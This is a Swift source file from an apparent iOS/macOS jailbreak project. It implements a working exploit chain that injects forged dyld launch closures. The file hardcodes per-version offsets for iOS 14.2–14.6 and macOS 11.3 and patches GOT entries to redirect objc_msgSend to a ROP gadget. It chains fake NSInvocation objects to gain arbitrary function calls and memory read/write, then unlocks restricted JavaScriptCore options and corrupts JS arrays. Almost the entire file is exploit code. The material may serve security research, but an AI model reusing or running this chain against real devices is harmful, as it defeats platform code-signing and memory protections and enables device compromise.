//
//  PwnClosure.swift
//  ClosurePwn
//
//  Created by Linus Henze.
//  Copyright © 2021 Linus Henze. All rights reserved.
//

import Foundation
import MachO
import JailbreakUtils

public struct PwnClosureOffsets {
    public let memoryPoolPageCount: UInt64 = 500
    public let objc_invoke:         UInt64
    public let selector:            UInt64
    
    public static func forCurrentVersion() throws -> PwnClosureOffsets {
        #if os(iOS)
            let v = ProcessInfo.processInfo.operatingSystemVersion
            if v.majorVersion == 14 {
                if v.minorVersion == 2 {
                    return PwnClosureOffsets(objc_invoke: 0x6D818, selector: 0x127C30)
                } else if v.minorVersion == 3 || v.minorVersion == 4 {
                    return PwnClosureOffsets(objc_invoke: 0x6C38C, selector: 0x127C90)
                } else if v.minorVersion == 5 || v.minorVersion == 6 {
                    return PwnClosureOffsets(objc_invoke: 0x6E800, selector: 0x127D30)
                }
            }
        #elseif os(macOS) && arch(arm64)
            let v = ProcessInfo.processInfo.operatingSystemVersion
            if v.majorVersion == 11 {
                if v.minorVersion == 3 {
                    return PwnClosureOffsets(objc_invoke: 0x70F0C, selector: 0x143548)
                }
            }
        #else
            #error("Unsupported OS!")
            // macOS
        #endif
        
        throw ClosureInjectionError.unsupportedOSVersion
    }
}

enum ClosureInjectionError: Error {
    case noTopImage
    case noTopImageNumber
    case noMainEntry
    case noFlags(image: Image)
    case gotEntryNotFound(entry: String)
    case dyldFuncNotFound
    case noSharedCache
    case noGadgetsFound
    case imageNotFound(path: String)
    case dyldEntryVectorNotFound
    case noImageArray
    case symbolNotFound(symbol: String)
    case noCodeSignatureFound
    case badPool
    case magicCookieNotFound
    case unsupportedOSVersion
}

func getMagicCookieOGuardLoc(sharedCache: SharedCache) -> OpaquePointer? {
    guard let invoke = class_getInstanceMethod(NSClassFromString("NSInvocation"), NSSelectorFromString("invoke")) else {
        return nil
    }
    
    let invokeAddr = stripPtr(method_getImplementation(invoke))
    let invokeAddrInt = UInt64(UInt(bitPattern: invokeAddr))
    let invokePtr = UnsafePointer<UInt32>(invokeAddr)
    for i in 0..<100 /* arbitrary limit */ {
        if let emulated = ARM64Inst.emulateAdrpLdr(adrp: invokePtr[i], ldr: invokePtr[i+1], pc: invokeAddrInt + UInt64(i*4)) {
            // Found adrp ldr, check for cmn
            if (invokePtr[i+2] & 0xFFFFFC1F) == 0xB100041F {
                // This is our cmn instruction, now check the regs
                let ldrReg = invokePtr[i+1] & 0x1F
                let cmnReg = (invokePtr[i+2] >> 5) & 0x1F
                if ldrReg == cmnReg {
                    // This is it
                    return OpaquePointer(bitPattern: UInt(emulated))
                }
            }
        }
    }
    
    return nil
}

func patchGOTEntry(_ topImage: Image, name: String, new: ResolvedSymbolTarget) throws -> Bool {
    guard let loc = dlsym(dlopen(nil, 0), name) else {
        return false
    }
    
    let off = try SharedCache.running.offsetOfPointer(stripPtr(OpaquePointer(loc)))
    
    guard let chained = topImage.findChild(byType: 27) as? ChainedFixupsEntry else {
        return false
    }
    
    for i in 0..<chained.targets.count {
        if chained.targets[i].rawValue == off.rawValue {
            chained.targets[i] = new
            return true
        }
    }
    
    return false
}

#if os(iOS)
    let gDeps = [
        "/System/Library/PrivateFrameworks/FrontBoard.framework/FrontBoard",
        "/System/Library/Frameworks/Foundation.framework/Foundation",
        "/usr/lib/libobjc.A.dylib",
        "/usr/lib/libSystem.B.dylib",
        "/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation",
        "/System/Library/Frameworks/Intents.framework/Intents"
    ]
#elseif os(macOS)
    let gDeps = [
        "/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation",
        "/usr/lib/libobjc.A.dylib",
        "/usr/lib/libSystem.B.dylib",
        "/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation",
        "/System/Library/Frameworks/Intents.framework/Versions/A/Intents"
    ]
#else
    #error("Unknown OS!")
#endif

open class PwnClosure {
    public typealias ROPGadget = (location: UInt64, x0Offset: UInt16, xAOffset: UInt16)
    
    private static var ropGadgets: [UnsafeRawPointer: [ROPGadget]] = [:]
    
    public let offsets: PwnClosureOffsets
    public let closure: LaunchClosure
    public let pool: ClosureMemoryPool
    public let fakeArray: FakeArray = FakeArray()
    public let ropGadget: ROPGadget
    
    public var noprint: Bool = false
    
    public init(name: String = "Something") throws {
        // Load ContactsFoundation to resolve CNFileServices
        #if os(iOS)
            dlopen("/System/Library/PrivateFrameworks/ContactsFoundation.framework/ContactsFoundation", RTLD_NOW)
        #elseif os(macOS)
            dlopen("/System/Library/PrivateFrameworks/ContactsFoundation.framework/Versions/A/ContactsFoundation", RTLD_NOW)
        #else
            #error("Unknown OS!")
        #endif
        
        offsets = try PwnClosureOffsets.forCurrentVersion()
        
        closure = try createExploitClosure(injectedImage: "/usr/lib/libMTLCapture.dylib", dependencies: gDeps, name: name)
        
        // Create empty image and pool
        let emptyNum = addEmptyImage(toClosure: closure, imagePath: "/usr/lib/dyld", pageCount: UInt32(offsets.memoryPoolPageCount))
        pool = ClosureMemoryPool(imageNumber: emptyNum, offset: 0x1000 * 200, size: 0x1000 * offsets.memoryPoolPageCount)
        
        let cache = try SharedCache()
        
        let gadgets = Self.findSimpleROPGadget(sharedCache: cache)
        guard gadgets.count > 0 else {
            throw ClosureInjectionError.noGadgetsFound
        }
        
        // Choose the gadget requiring the least amount of memory
        var currentBest = gadgets[0]
        for g in gadgets {
            if (g.x0Offset + g.xAOffset) < (currentBest.x0Offset + currentBest.xAOffset) {
                currentBest = g
            }
        }
        
        ropGadget = currentBest
    }
    
    public func getClosure() throws -> LaunchClosure {
        guard let top = closure.findImage(byNumber: 0x2002) else {
            throw ClosureInjectionError.noTopImage
        }
        
        guard top.imageNumber != nil else {
            throw ClosureInjectionError.noTopImageNumber
        }
        
        guard let mainEntry = closure.findChild(byType: 40) as? MainEntry else {
            throw ClosureInjectionError.noMainEntry
        }
        
        mainEntry.target = .image(number: top.imageNumber!, offset: offsets.objc_invoke)
        
        guard let flags = top.flags else {
            throw ClosureInjectionError.noFlags(image: top)
        }
        
        flags.hasObjC = false
        flags.hasPrecomputedObjC = false
        
        let fixups: BindFixups = top.getOrCreateChild(type: 21)
        var patterns: [BindFixups.BindPattern] = []
        
        // Step one: Change "sharedInstance" selector to -1 (the value to write to magic_cookie.oGuard)
        patterns.append(.init(withTarget: .absolute(address: 0xFFFFFFFFFFFFFFF), andVMOffset: offsets.selector))
        patterns.append(.init(withTarget: .absolute(address: 0xFFFFFFFFFFFFFFF), andVMOffset: offsets.selector + 1))
        
        // Workaround: Break the chained fixups so that this is not rebased
        patterns.append(.init(withTarget: .absolute(address: 0), andVMOffset: offsets.selector - 8))
        
        // Step two: Change objc_msgSend to our ROP gadget
        guard try patchGOTEntry(top, name: "objc_msgSend", new: .sharedCache(offset: ropGadget.location)) else {
            throw ClosureInjectionError.gotEntryNotFound(entry: "objc_msgSend")
        }
        
        // Step three: Change objc_retainAutoreleasedReturnValue to -[NSInvocation invoke]
        let invokeMeth = class_getInstanceMethod(NSClassFromString("NSInvocation"), NSSelectorFromString("invoke"))
        let invokeTarget = try SharedCache.running.offsetOfPointer(method_getImplementation(invokeMeth!))
        
        guard try patchGOTEntry(top, name: "objc_retainAutoreleasedReturnValue", new: invokeTarget) else {
            throw ClosureInjectionError.gotEntryNotFound(entry: "objc_retainAutoreleasedReturnValue")
        }
        
        // Step four: Create NSInvocation objects
        let rootInvocation = try generatePayload()
        
        print("Root invoke at: \(rootInvocation.reference)")
        
        // Step five: Replace pointer to NSMutableData with pointer to root NSInvocation object
        guard try patchGOTEntry(top, name: "OBJC_CLASS_$_NSMutableData", new: rootInvocation.reference) else {
            throw ClosureInjectionError.gotEntryNotFound(entry: "OBJC_CLASS_$_NSMutableData")
        }
        
        // Done!
        
        print("Total pool memory used: \(pool.currentOffset) bytes")
        
        fixups.patterns.append(contentsOf: patterns)
        try pool.writeInto(closure: closure)
        
        return closure
    }
    
    open func generatePayload() throws -> ClosureMemoryObject {
        return try finalizePayload()
    }
    
    public func finalizePayload() throws -> ClosureMemoryObject {
        guard let magicCookieLoc = getMagicCookieOGuardLoc(sharedCache: SharedCache.running) else {
            throw ClosureInjectionError.magicCookieNotFound
        }
        
        let magicCookieOff = try SharedCache.running.intOffsetOfPointer(magicCookieLoc)
        
        let arrayRef = try pool.append(object: fakeArray).reference
        
        print("Fake Array: \(arrayRef)")
        
        let rootInvoke = try ROPInvocation(pool: pool, arguments: [
            arrayRef,
            try SharedCache.running.offsetOfSelector("makeObjectsPerformSelector:"),
            try SharedCache.running.offsetOfSelector("invoke"),
        ])
        
        rootInvoke.ropOffset = ropGadget.x0Offset
        rootInvoke.ropTarget = .sharedCache(offset: magicCookieOff - UInt64(ropGadget.xAOffset))
        
        return try pool.append(object: rootInvoke)
    }
    
    public func invokeWithResult(arguments: [ResolvedSymbolTarget], returnLoc: ResolvedSymbolTarget, realNSInvocation: Bool = false) throws -> DeferredInsertion {
        let fakeForStore = try FakeInvocation(pool: pool, argCount: 1, argumentsLoc: returnLoc)
        let fakeForStoreRef = try pool.append(object: fakeForStore).reference
        
        var args: [ResolvedSymbolTarget] = [
            fakeForStoreRef,
            try SharedCache.running.offsetOfSelector("setTarget:")
        ]
        
        while args.count < 30 {
            args.append(.absolute(address: 0x41424344))
        }
        
        let storage = try FakeInvocation.getArgumentStorage(pool: pool, arguments: args).reference
        
        let secondInvoke = try FakeInvocation(pool: pool, argCount: 3, argumentsLoc: storage)
        let secondInvokeRef = try pool.append(object: secondInvoke).reference
        
        let firstInvoke = try FakeInvocation(pool: pool, arguments: arguments, returnStorage: secondInvoke.referenceToArgument(2), realNSInvocation: realNSInvocation)
        let firstInvokeRef = try pool.append(object: firstInvoke).reference
        
        let deferred = DeferredInsertion(fakeArray: fakeArray, invocation: firstInvoke, content: [firstInvokeRef, secondInvokeRef])
        
        return deferred
    }
    
    public func invoke(arguments: [ResolvedSymbolTarget], realNSInvocation: Bool = false) throws -> DeferredInsertion {
        let invoke = try FakeInvocation(pool: pool, arguments: arguments, realNSInvocation: realNSInvocation)
        let invokeRef = try pool.append(object: invoke).reference
        
        let deferred = DeferredInsertion(fakeArray: fakeArray, invocation: invoke, content: [invokeRef])
        
        return deferred
    }
    
    /**
     * Reads some value (with optional offset).
     * In case from or to is nil, it will return a ResolvedSymbolTarget to which the from/to argument should be written
     */
    public func reader(from: ResolvedSymbolTarget? = nil, offset: UInt32 = 0, to: ResolvedSymbolTarget? = nil) throws -> (deferred: DeferredInsertion, from: ResolvedSymbolTarget?, to: ResolvedSymbolTarget?) {
        return try _rw_impl(from: from, offset: offset, to: to, writer: false)
    }
    
    /**
     * Reads some value (with optional offset).
     * In case from or to is nil, it will return a ResolvedSymbolTarget to which the from/to argument should be written
     */
    public func writer(from: ResolvedSymbolTarget? = nil, offset: UInt32 = 0, to: ResolvedSymbolTarget? = nil) throws -> (deferred: DeferredInsertion, from: ResolvedSymbolTarget?, to: ResolvedSymbolTarget?) {
        // Need to flip to and from
        return try _rw_impl(from: to, offset: offset, to: from, writer: true)
    }
    
    public func _rw_impl(from: ResolvedSymbolTarget? = nil, offset: UInt32 = 0, to: ResolvedSymbolTarget? = nil, writer: Bool = false) throws -> (deferred: DeferredInsertion, from: ResolvedSymbolTarget?, to: ResolvedSymbolTarget?) {
        var returnFrom: ResolvedSymbolTarget? = nil
        var returnTo: ResolvedSymbolTarget? = nil
        
        let invocation = try FakeInvocation(pool: pool, argCount: offset + 1, argumentsLoc: from ?? .absolute(address: 0))
        let memObj = try pool.append(object: invocation)
        if from == nil {
            // No from, return &argumentsLoc
            let ref = memObj.reference
            guard case .image(number: let imNum, offset: let off) = ref else {
                throw ClosureInjectionError.badPool
            }
            
            returnFrom = .image(number: imNum, offset: off + 8)
        }
        
        let readInv = try FakeInvocation(pool: pool, arguments: [
            memObj.reference,
            writer ? SharedCache.running.offsetOfSelector("setArgument:atIndex:") : SharedCache.running.offsetOfSelector("getArgument:atIndex:"),
            to ?? .absolute(address: 0),
            .absolute(address: UInt64(offset))
        ])
        
        let readMemObj = try pool.append(object: readInv)
        if to == nil {
            // No to, return &readInv[2]
            returnTo = readInv.referenceToArgument(2)
        }
        
        let deferred = DeferredInsertion(fakeArray: fakeArray, invocation: readInv, content: [
            readMemObj.reference
        ])
        
        if writer {
            return (deferred: deferred, from: returnTo, to: returnFrom)
        } else {
            return (deferred: deferred, from: returnFrom, to: returnTo)
        }
    }
    
    public func callCFunc(name: String, arguments: [ResolvedSymbolTarget], lib: String? = nil, resultStorage: ResolvedSymbolTarget? = nil) throws -> DeferredInsertion {
        // Create the invocation for the call
        var callData: DeferredInsertion!
        if resultStorage != nil {
            callData = try invokeWithResult(arguments: arguments, returnLoc: resultStorage!, realNSInvocation: true)
        } else {
            callData = try invoke(arguments: arguments, realNSInvocation: true)
        }
        
        var targetSelSetterContent: [ResolvedSymbolTarget] = []
        
        // Create target/selector setter
        // This is a hack for iOS 14.5
        if arguments.count > 0 {
            let targetSetter = try invoke(arguments: [
                callData.content[0],
                try SharedCache.running.offsetOfSelector("setTarget:"),
                arguments.count > 0 ? arguments[0] : .absolute(address: 0)
            ])
            
            targetSelSetterContent.append(contentsOf: targetSetter.content)
            
            if arguments.count > 1 {
                let selSetter = try invoke(arguments: [
                    callData.content[0],
                    try SharedCache.running.offsetOfSelector("setSelector:"),
                    arguments.count > 1 ? arguments[1] : .absolute(address: 0)
                ])
                
                targetSelSetterContent.append(contentsOf: selSetter.content)
                
                callData.invocation.realNSInvArgStorage = [
                    targetSetter.invocation.referenceToArgument(2),
                    selSetter.invocation.referenceToArgument(2)
                ]
            } else {
                callData.invocation.realNSInvArgStorage = [
                    targetSetter.invocation.referenceToArgument(2)
                ]
            }
        }
        
        // Create the outer invocation
        let outer = try invoke(arguments: [
            callData.content[0],
            try SharedCache.running.offsetOfSelector("invokeUsingIMP:"),
            try SharedCache.running.offsetOfPointer(dlsym(dlopen(nil, 0), name))
        ])
        
        var toInsert = targetSelSetterContent + outer.content
        if callData.content.count == 2 {
            toInsert.append(callData.content[1])
        }
        
        let deffered = DeferredInsertion(fakeArray: fakeArray, invocation: callData.invocation, content: toInsert)
        
        return deffered
    }
    
    open func printStaticString(_ str: String) throws {
        if !noprint {
            let ns = try FakeNSString(str).toMemoryObject(memoryPool: pool)
            try callCFunc(name: "NSLog", arguments: [
                ns.reference
            ]).insertNow()
        }
    }
    
    public struct DeferredInsertion {
        public let fakeArray: FakeArray
        public let invocation: FakeInvocation
        public let content: [ResolvedSymbolTarget]
        
        public init(fakeArray: FakeArray, invocation: FakeInvocation, content: [ResolvedSymbolTarget]) {
            self.fakeArray = fakeArray
            self.invocation = invocation
            self.content = content
        }
        
        public func insertNow() {
            fakeArray.content.append(contentsOf: content)
        }
    }
    
    // Finds gadgets of the form
    // ldr xA, [x0, #x0Offset] // x0Offset >= 0x20 && (x0Offset < 0x30 || x0Offset >= 0x48)
    // str x1, [xA, #xAOffset]
    // ret
    // There is also a more complex version of this gadget (not implemented)
    // TODO: This finder is way too slow
    public static func findSimpleROPGadget(sharedCache: SharedCache) -> [ROPGadget] {
        // Cache results
        if let result = ropGadgets[sharedCache.cachePtr] {
            return result
        }
        
        let buf = UnsafeRawBufferPointer(start: sharedCache.cachePtr, count: Int(sharedCache.mappings[0].size)).bindMemory(to: UInt32.self)
        var result: [ROPGadget] = []
        
        var is64 = false
        var ldrDst: UInt8 = 0
        var ldrSrc: UInt8 = 0
        var ldrSrcOff: UInt16 = 0
        var strDst: UInt8 = 0
        var strSrc: UInt8 = 0
        var strDstOff: UInt16 = 0
        
        for i in 0..<(buf.count - 3) {
            guard ARM64Inst.ldrImmArgs(ofInstruction: buf[i], is64: &is64, dst: &ldrDst, src: &ldrSrc, srcOff: &ldrSrcOff) else {
                continue
            }
            
            guard is64 && ldrDst >= 2 && ldrSrc == 0 && ldrSrcOff >= 0x20 && (ldrSrcOff < 0x30 || ldrSrcOff >= 0x48) else {
                continue
            }
            
            guard ARM64Inst.strImmArgs(ofInstruction: buf[i+1], is64: &is64, src: &strSrc, dst: &strDst, dstOff: &strDstOff) else {
                continue
            }
            
            guard is64 && strDst == ldrDst && strSrc == 1 else {
                continue
            }
            
            guard buf[i+2] == 0xd65f03c0 /* ret */ else {
                continue
            }
            
            result.append((location: UInt64(i * 4), x0Offset: ldrSrcOff, xAOffset: strDstOff))
            break // Stop now, for speed
        }
        
        // Cache result
        ropGadgets[sharedCache.cachePtr] = result
        
        return result
    }
}

enum JSPwnClosureError: Error {
    case notInitialized
}

open class GenericJSClosure: PwnClosure {
    private var jsContext: ClosureMemoryObject?
    
    public func initJSRuntime(utilsPath: String, setupPath: String) throws {
        try printStaticString("[JSInit] Initializing JS Runtime")
        
#if os(iOS)
        let JSLibPath = "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"
        let intentLibPath = "/System/Library/Frameworks/Intents.framework/Intents"
#elseif os(macOS)
        let JSLibPath = "/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/JavaScriptCore"
        let intentLibPath = "/System/Library/Frameworks/Intents.framework/Versions/A/Intents"
#else
        #error("Unsupported OS")
#endif
        
        // Ensure libs are loaded
        dlopen(JSLibPath, RTLD_NOW)
        dlopen(intentLibPath, RTLD_NOW)
        
        // Workaround for iOS 14.6: WTF::initialize() clears restrictedOptionsEnabled (bug?)
        // -> Call WTF::initialize() first, then set restrictedOptionsEnabled
        try callCFunc(name: "_ZN3WTF10initializeEv", arguments: [
            .absolute(address: 1)
        ], lib: JSLibPath).insertNow()
        
        // Allow $vm (restricted option)
        try callCFunc(name: "_ZN3JSC6Config23enableRestrictedOptionsEv", arguments: [
            .absolute(address: 1) // Doesn't take an argument but callCFunc requires at least one argument (which may not be zero)
        ], lib: JSLibPath).insertNow()
        
        try printStaticString("[JSInit] Allowed $vm")
        
        // Force init
        try callCFunc(name: "NSClassFromString", arguments: [
            try FakeNSString("JSContext").toMemoryObject(memoryPool: pool).reference
        ]).insertNow()
        
        // Build our JS context and init it
        jsContext = try FakeEmptyObject(allocSize: 0x500, className: "JSContext").toMemoryObject(memoryPool: pool)
        try invoke(arguments: [
            jsContext!.reference,
            try SharedCache.running.offsetOfSelector("init")
        ]).insertNow()
        
        // Load utils
        try runJSFile(path: utilsPath)
        
        // Corrupt some stuff
        try invoke(arguments: [
            jsContext!.reference,
            SharedCache.running.offsetOfSelector("evaluateScript:"),
            try FakeNSString("let noCoW = 13.37; let target = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6]; let float_arr = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6]; let obj_arr = [{}, {}, {}, {}, {}, {}, {}];").toMemoryObject(memoryPool: pool).reference
        ]).insertNow()
        
        let rw2 = try writer(offset: 1)
        let rd2_1 = try reader(offset: 1, to: rw2.from!)
        let rd2_2 = try reader(offset: 1, to: rd2_1.from!)
        
        let rd3_1 = try reader(offset: 1, to: rw2.to!)
        
        // Corrupt target to point to &float_arr + 8
        try invokeWithResult(arguments: [
            jsContext!.reference,
            SharedCache.running.offsetOfSelector("evaluateScript:"),
            try FakeNSString("float_arr[0] = Add(addrof(float_arr), 8).asDouble(); float_arr").toMemoryObject(memoryPool: pool).reference
        ], returnLoc: rd2_2.from!).insertNow()
        
        try invokeWithResult(arguments: [
            jsContext!.reference,
            SharedCache.running.offsetOfSelector("evaluateScript:"),
            try FakeNSString("target").toMemoryObject(memoryPool: pool).reference
        ], returnLoc: rd3_1.from!).insertNow()
        
        // Insert
        rd3_1.deferred.insertNow()
        rd2_2.deferred.insertNow()
        rd2_1.deferred.insertNow()
        rw2.deferred.insertNow()
        
        // Good, clobbered target
        // Almost ready to run exploit, just need to insert a few objects
        
        // Need to init both classes...
        // INImage
        let inimage = try invoke(arguments: [
            jsContext!.reference,
            SharedCache.running.offsetOfSelector("setObject:forKeyedSubscript:"),
            SharedCache.running.offsetOfObjCClass("INImage"),
            try FakeNSString("inimage").toMemoryObject(memoryPool: pool).reference
        ])
        
        // Force init
        try callCFunc(name: "NSClassFromString", arguments: [
            try FakeNSString("INImage").toMemoryObject(memoryPool: pool).reference
        ]).insertNow()
        
        inimage.insertNow()
        
        // INIntent
        let fakeIntent = try FakeEmptyObject(allocSize: 0x20, className: "INIntent").toMemoryObject(memoryPool: pool)
        
        // Force init
        try callCFunc(name: "NSClassFromString", arguments: [
            try FakeNSString("INIntent").toMemoryObject(memoryPool: pool).reference
        ]).insertNow()
        
        try invoke(arguments: [
            jsContext!.reference,
            SharedCache.running.offsetOfSelector("setObject:forKeyedSubscript:"),
            fakeIntent.reference,
            try FakeNSString("inintent").toMemoryObject(memoryPool: pool).reference
        ]).insertNow()
        
        // Export infos
        let info = try exportJSInfos()
        try invoke(arguments: [
            jsContext!.reference,
            try SharedCache.running.offsetOfSelector("setObject:forKeyedSubscript:"),
            info,
            try FakeNSString("info").toMemoryObject(memoryPool: pool).reference
        ]).insertNow()
        
        try printStaticString("[JSInit] Running JS Setup")
        
        try runJSFile(path: setupPath)
        
        try printStaticString("[JSInit] Done")
    }
    
    public func runJSFile(path: String) throws {
        guard jsContext != nil else {
            throw JSPwnClosureError.notInitialized
        }
        
        let toRun = try invoke(arguments: [
            jsContext!.reference,
            SharedCache.running.offsetOfSelector("evaluateScript:"),
            .absolute(address: 0)
        ])
        
        try invokeWithResult(arguments: [
            SharedCache.running.offsetOfObjCClass("NSString"),
            SharedCache.running.offsetOfSelector("stringWithContentsOfFile:"),
            try FakeNSString(path).toMemoryObject(memoryPool: pool).reference
        ], returnLoc: toRun.invocation.referenceToArgument(2)).insertNow()
        
        toRun.insertNow()
    }
    
    private func exportJSInfos() throws -> ResolvedSymbolTarget {
        let invoke = try FakeInvocation(pool: pool, arguments: [
            .absolute(address: 0),
            try SharedCache.running.offsetOfSelector("invoke"),
            .absolute(address: 0),
            .absolute(address: 0),
            .absolute(address: 0),
            .absolute(address: 0),
            .absolute(address: 0),
            .absolute(address: 0),
            .absolute(address: 0),
            .absolute(address: 0)
        ])
        let invokeRef = try pool.append(object: invoke).reference
        
        let invoke2 = try FakeInvocation(pool: pool, arguments: [
            .absolute(address: 0),
            try SharedCache.running.offsetOfSelector("invokeUsingIMP:"),
            .absolute(address: 0),
            .absolute(address: 0),
            .absolute(address: 0),
            .absolute(address: 0),
            .absolute(address: 0),
            .absolute(address: 0),
            .absolute(address: 0),
            .absolute(address: 0)
        ], realNSInvocation: true)
        let invoke2Ref = try pool.append(object: invoke2).reference
        
        let bufMem = try pool.makeMemoryObject(size: 0x100000, data: [
            // Speed up JS execution: Without this, writing the first time will
            // take *really* long (about 6 seconds)
            // This is due to the strategy used in JS to write to memory: An array is used and
            // without this the size of the array will be 0 for a long time
            .init(offset: 0, target: .absolute(address: 0x0000133700001337))
        ], atEnd: true)
        
        let res = try pool.makeMemoryObject(size: 72, data: [
            try .class(offset: 0, className: "NSObject"),
            .init(offset: 8, target: invokeRef), // First invocation
            .init(offset: 16, target: invoke2Ref), // Second invocation
            .init(offset: 24, target: .image(number: pool.imageNumber, offset: bufMem.startOffset + 8)),
            .init(offset: 32, target: try SharedCache.running.offsetOfPointer(dlsym(dlopen(nil, 0), "dlsym")), pacKey: .IA(context: 0, derived: false)),
            .init(offset: 40, target: try SharedCache.running.offsetOfSelector("sharedInstance")),
            .init(offset: 48, target: try SharedCache.running.offsetOfSelector("invokeUsingIMP:")),
            .init(offset: 56, target: try SharedCache.running.offsetOfSelector("setTarget:")),
            .init(offset: 64, target: try SharedCache.running.offsetOfSelector("setSelector:")),
        ])
        
        return res.reference
    }
}

open class ROPInvocation: FakeInvocation {
    public var ropOffset: UInt16 = 0
    public var ropTarget: ResolvedSymbolTarget = .rebase
    
    public override func toMemoryObject(memoryPool: ClosureMemoryPool) throws -> ClosureMemoryObject {
        guard ropOffset >= 0x20 && (ropOffset < 0x30 || ropOffset >= 0x48) else {
            throw MemoryPoolError.invalidArgument(arg: self.ropOffset, description: "Invalid ROP offset!")
        }
        
        let off = UInt64(ropOffset >> 3)
        
        let addDataLen = (off < 8) ? 0 : (off - 8)
        
        let sig = try memoryPool.append(object: signature)
        
        var descs: [ClosureMemoryDescriptor] = [
            try .class(offset: 0, className: "NSBlockInvocation"),
            .init(offset: 8, target: argumentStorage),
            .init(offset: 16, target: returnStorage),
            .init(offset: 24, target: sig.reference),
            .init(offset: 32, target: .absolute(address: 0)), // Container
            .init(offset: 40, target: .absolute(address: 0)), // replaced...
            .init(offset: 48, target: .absolute(address: 0)), // signedTarget
            .init(offset: 56, target: .absolute(address: 0)), // signedSelector
            .init(offset: 64, target: .absolute(address: 0))  // magic
        ]
        
        for i in 0..<addDataLen {
            descs.append(.init(offset: 72 + (i * 8), target: .absolute(address: 0)))
        }
        
        descs[Int(off)].target = ropTarget
        
        let res = try memoryPool.makeMemoryObject(size: (9 + addDataLen) * 8, data: descs)
        
        return res
    }
}
